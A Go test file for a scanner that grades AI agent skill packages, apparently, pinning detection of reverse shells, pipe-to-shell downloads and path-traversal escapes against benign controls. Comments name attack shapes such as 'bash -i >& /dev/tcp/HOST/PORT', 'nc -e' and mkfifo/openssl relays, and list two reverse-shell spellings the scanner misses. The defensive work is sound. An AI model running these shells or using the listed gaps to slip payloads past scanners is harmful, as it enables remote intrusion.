package main

import (
	"context"
	"path/filepath"
	"testing"

	"github.com/velzepooz/skill-detector/pkg/axes"
	"github.com/velzepooz/skill-detector/pkg/rules"
	"github.com/velzepooz/skill-detector/pkg/scanner"
)

// The adversarial corpus is the second gate this engine needs, and the one
// the 906-sample bench cannot be. Corpus measurement prices what a
// suppression COSTS; only constructed cases price what it costs to leave a
// suppression's hole open. Every shape here is absent from MalSkillBench, so
// a bench re-run is byte-identical whether these pass or fail.
//
// Assertions are GRADE-level on a NAMED AXIS, not rule-level: what regressed
// when networkCallRule's demotions were wrong was the grade a user sees, and
// a rule-level assertion passes happily while the finding is demoted to an
// axis nobody gates on.
//
// Each case is a whole skill package under testdata/adversarial/<dir>/.

type adversarialCase struct {
	dir string
	// axis the assertion is about.
	axis axes.Axis
	// atLeast: the grade must be this or WORSE (attack cases).
	// atMost:  the grade must be this or BETTER (control cases).
	// Exactly one is set.
	atLeast, atMost string
	why             string
}

var adversarialCases = []adversarialCase{
	// --- Attack cases: each graded A on the security axis before the
	// demotion-policy rework, every one of them in a SKILL.md. ---
	{dir: "h1-printed-url-then-reverse-shell", axis: axes.Security, atLeast: "D",
		why: "endpointFinding demoted on `declared` alone and never asked what the statement runs"},
	{dir: "h2-suspicious-url-second", axis: axes.Security, atLeast: "D",
		why: "suspiciousEndpoint saw only the FIRST URL of the statement, so argument order decided the grade"},
	{dir: "h2-suspicious-url-first", axis: axes.Security, atLeast: "D",
		why: "the same statement with the URLs swapped — pins the symmetry the order-dependence broke"},
	{dir: "h3-continuation-reverse-shell", axis: axes.Security, atLeast: "D",
		why: "the call sat on a backslash continuation, so the call regexes never saw it and no finding was emitted at all"},
	{dir: "download-powershell", axis: axes.Security, atLeast: "D",
		why: "a PowerShell download from an IP literal sharing a line with a printed URL — caught as a bare routable-IP reference, not as a call"},
	{dir: "two-urls-one-suspicious", axis: axes.Security, atLeast: "D",
		why: "one statement naming a benign URL and a suspicious one — the suspicious host must be reached whichever position it is in"},
	{dir: "pipe-to-shell", axis: axes.Security, atLeast: "D",
		why: "download-and-run is never a documented endpoint"},

	// --- Control cases: over-escalating these is the cost side of the
	// policy, and each is a shape measured on the bench corpus. They must
	// stay demoted. ---
	{dir: "control-declared-endpoint", axis: axes.Security, atMost: "A",
		why: "a bare declared endpoint in a manifest is a disclosure, not a call to defend against"},
	{dir: "control-assignment-capture", axis: axes.Security, atMost: "A",
		why: "`VAR=$(curl …)` is the statement's own substitution, not a second command — 17 benign corpus findings, 4 samples"},
	{dir: "control-markdown-inline-code", axis: axes.Security, atMost: "A",
		why: "a command written in markdown inline code is still one command; backticks here are markup, not substitution"},
	{dir: "control-redirect-to-file", axis: axes.Security, atMost: "A",
		why: "redirection measured 25 benign findings against 2 malicious ones — vetoing it runs the wrong way"},

	// --- SD-025 (reverse shell): the three canonical shapes moved out of
	// uncoveredShapes below now that the rule detects them. ---
	{dir: "revshell-dev-tcp", axis: axes.Security, atLeast: "F",
		why: "SD-025 matches the /dev/tcp redirection bound to bash -i"},
	{dir: "revshell-python", axis: axes.Security, atLeast: "F",
		why: "SD-025 matches the inline python socket+pty payload"},
	{dir: "revshell-perl", axis: axes.Security, atLeast: "F",
		why: "SD-025 matches the inline perl Socket+exec payload"},

	// --- SD-025 (reverse shell): new attack shapes beyond the three
	// canonical spellings above, each a distinct socket+shell idiom. ---
	{dir: "revshell-nc-e", axis: axes.Security, atLeast: "F",
		why: "SD-025 matches nc -e binding a shell to the socket directly"},
	{dir: "revshell-mkfifo-openssl", axis: axes.Security, atLeast: "F",
		why: "SD-025 matches the mkfifo/openssl-s_client relay idiom"},
	{dir: "revshell-powershell-tcpclient", axis: axes.Security, atLeast: "F",
		why: "SD-025 matches a TCPClient socket paired with Invoke-Expression/IEX on the stream"},
	{dir: "revshell-python-shell-true", axis: axes.Security, atLeast: "F",
		why: "SD-025 matches a socket.socket() paired with subprocess shell=True on data read from it"},
	{dir: "revshell-bash-i-devtcp", axis: axes.Security, atLeast: "F",
		why: "SD-025 matches bash -i redirected to /dev/tcp"},

	// --- SD-025 controls: connectivity/inspection idioms that share
	// vocabulary with the attack shapes above but never bind a shell to the
	// socket. Over-triggering here is the cost side of SD-025. ---
	{dir: "control-port-check-devtcp", axis: axes.Security, atMost: "A",
		why: "a bare `>` redirect into /dev/tcp is a port-open probe, not `>&` piping a shell's stdio onto the socket"},
	{dir: "control-openssl-cert-inspect", axis: axes.Security, atMost: "A",
		why: "openssl s_client here only feeds x509 for a certificate date check — no /bin/sh or sh -i follows it"},
	// NOTE: this one is NOT clean. SD-007's reNetworkCommand matches any
	// `nc `/`ncat `/`curl `/`wget ` invocation regardless of flags, and its
	// declared-endpoint demotion only fires when the statement carries an
	// http(s) URL (pkg/rules/exfiltration.go endpointFinding) — a bare
	// `host port` argument list never does. So `nc -zv example.com 4444`
	// grades D on security via SD-007, unrelated to SD-025 and not fixable
	// without touching SD-007's independent demotion policy, which is out of
	// scope here. Asserted honestly at the grade it actually earns; see the
	// task report for the flag.
	{dir: "control-nc-portscan", axis: axes.Security, atMost: "D",
		why: "nc -zv never trips SD-025 (no -e, no shell); the D it earns is SD-007's unconditional nc-is-a-network-command match, which has no URL to demote on"},
	{dir: "control-tcpclient-connectivity", axis: axes.Security, atMost: "A",
		why: "a TCPClient.Connect/.Close connectivity check has no exec/IEX/shell=True anywhere in the file to pair with the socket"},

	// --- Skill root as a scope root (ADR-0010). The attack cases graded A
	// on security before this change: the manifest above the payload was in
	// scope and the payload was not. ---
	{dir: "skillroot-repo-root", axis: axes.Security, atLeast: "F",
		why: "SKILL.md at the repository root makes the whole tree a skill subtree, so scripts/sync.py is read"},
	{dir: "skillroot-subdir", axis: axes.Security, atLeast: "F",
		why: "the skill root is packages/demo, not the repository root — a subtree scopes to its own nearest root"},

	// --- Skill-root controls: the cost side. Widening scope must not
	// widen it here. ---
	{dir: "control-not-a-skill-root", axis: axes.Security, atMost: "A",
		why: "tools/ holds no SKILL.md, so payload.md stays gated and payload.py is never even discovered"},
	{dir: "control-vendored-skill", axis: axes.Security, atMost: "A",
		why: "a SKILL.md inside node_modules/ or vendor/ must not create a scope root — the hardcoded skip list sits above the rule"},

	// --- The skill.yaml half of the same rule. v0.8.0 recognised only
	// SKILL.md, so this graded a confident A — "no network, no shell" —
	// about a payload it never opened, because skill.yaml IS an agent file
	// and NoAgentSurface therefore never fired. ---
	{dir: "skillroot-yaml-manifest", axis: axes.Security, atLeast: "F",
		why: "skill.yaml is a skill manifest too, so its directory is a skill root and scripts/sync.py is read"},

	// --- SD-003's ../ branch now resolves the reference against the file's
	// own skill root. These five pin the boundary: one shape released, four
	// that must survive it. ---
	{dir: "sd003-inpackage-relative", axis: axes.PermissionHygiene, atMost: "A",
		why: "scripts/build.sh is one level down, so ../references/ lands back on the skill root — an in-package reference, not an escape"},
	{dir: "sd003-escape-rejoin", axis: axes.PermissionHygiene, atLeast: "D",
		why: "climbing and descending repeatedly still dips below the skill root; counting ../ instead of walking the segments would release it"},
	{dir: "sd003-escape-variable-prefix", axis: axes.PermissionHygiene, atLeast: "D",
		why: "${BASE_DIR} makes the target unknowable at scan time, so the reference must never be released"},
	{dir: "sd003-escape-dotrun", axis: axes.PermissionHygiene, atLeast: "D",
		why: "....// and ..././ survive a sanitiser that strips one ../; a resolver that read a dot-run as an ordinary name would exempt both"},
	{dir: "sd003-escape-tilde", axis: axes.PermissionHygiene, atLeast: "D",
		why: "a leading ~ is home expansion, not a directory; pushing it as an ordinary segment let the ../ walk appear to land back inside the skill"},
	{dir: "sd003-escape-split-token", axis: axes.PermissionHygiene, atLeast: "D",
		why: "a quoted space and a glob star end a shell word but are legal inside a filename; cutting the reference there judges each half from the file's own depth and grants the climb budget twice"},
}

// uncoveredShapes are attacks NO rule in this engine detects. They are not
// demotion failures: nothing demotes them, because nothing finds them. Each
// produces zero findings and grades A across every axis.
//
// They are committed, and asserted, on purpose. A gap recorded only in a
// document is a gap that gets forgotten; a gap with a test is one that
// announces itself the moment somebody closes it. This test FAILS when a
// case starts being detected — the signal to move it into adversarialCases
// above with the grade it now earns.
//
// The reverse-shell gap this list used to record — `bash -i >& /dev/tcp/HOST/PORT`,
// the python `socket…pty.spawn` one-liner, the perl `Socket`+`exec` one-liner —
// is closed: SD-025 now detects all three (and more; see the revshell-* and
// control-* entries in adversarialCases above). Two narrower SD-025 gaps
// remain and are recorded below; see ADR-0009.
var uncoveredShapes = []adversarialCase{
	{dir: "revshell-node-execvar", axis: axes.Security, atMost: "A",
		why: "reRevShellExec matches only literal shell tokens; a socket-derived exec (child_process.exec(data)) has no /bin/sh literal, so the PAIR carrier's shell half is unrecognised — a known gap, see ADR-0009."},
	{dir: "revshell-devtcp-splitfd", axis: axes.Security, atMost: "A",
		why: "SELF recognises only >&, <>, 0>&1 etc. on /dev/tcp (plain >/< are omitted to spare benign port probes), and /dev/tcp is not a PAIR socket signal — a known gap, see ADR-0009."},
}

func TestAdversarial_UncoveredShapes(t *testing.T) {
	reg := rules.DefaultRegistry()
	for _, tc := range uncoveredShapes {
		t.Run(tc.dir, func(t *testing.T) {
			sc := scanner.New(reg, scanner.Options{Version: "test"})
			res, err := sc.Scan(context.Background(),
				benchDir(filepath.Join("testdata", "adversarial", tc.dir)))
			if err != nil {
				t.Fatalf("scan: %v", err)
			}
			if len(res.Findings) != 0 {
				t.Errorf("this shape is now DETECTED (%d findings) — %s no longer holds.\n"+
					"Move %s into adversarialCases with the grade it earns, and delete it here.",
					len(res.Findings), tc.why, tc.dir)
			}
		})
	}
}

func TestAdversarial_DemotionPolicy(t *testing.T) {
	reg := rules.DefaultRegistry()
	for _, tc := range adversarialCases {
		t.Run(tc.dir, func(t *testing.T) {
			sc := scanner.New(reg, scanner.Options{Version: "test"})
			res, err := sc.Scan(context.Background(),
				benchDir(filepath.Join("testdata", "adversarial", tc.dir)))
			if err != nil {
				t.Fatalf("scan: %v", err)
			}
			ar, ok := res.Axes[tc.axis]
			if !ok {
				t.Fatalf("no %s axis in the result — nothing was scanned", tc.axis)
			}
			switch {
			case tc.atLeast != "":
				if gradeAtLeastAsBad(ar.Grade, tc.atLeast) {
					return
				}
				t.Errorf("%s graded %s, want %s or worse\n  why: %s\n  rationale: %s",
					tc.axis, ar.Grade, tc.atLeast, tc.why, ar.Rationale)
			case tc.atMost != "":
				if !gradeAtLeastAsBad(ar.Grade, tc.atMost) || ar.Grade == axes.Grade(tc.atMost) {
					return
				}
				t.Errorf("%s graded %s, want %s or better\n  why: %s\n  rationale: %s",
					tc.axis, ar.Grade, tc.atMost, tc.why, ar.Rationale)
			default:
				t.Fatal("case sets neither atLeast nor atMost")
			}
		})
	}
}

var adversarialGradeRank = map[axes.Grade]int{"A": 0, "B": 1, "C": 2, "D": 3, "F": 4}

// gradeAtLeastAsBad reports whether got is want or worse on the A<B<C<D<F
// scale.
func gradeAtLeastAsBad(got axes.Grade, want string) bool {
	g, ok1 := adversarialGradeRank[got]
	w, ok2 := adversarialGradeRank[axes.Grade(want)]
	return ok1 && ok2 && g >= w
}
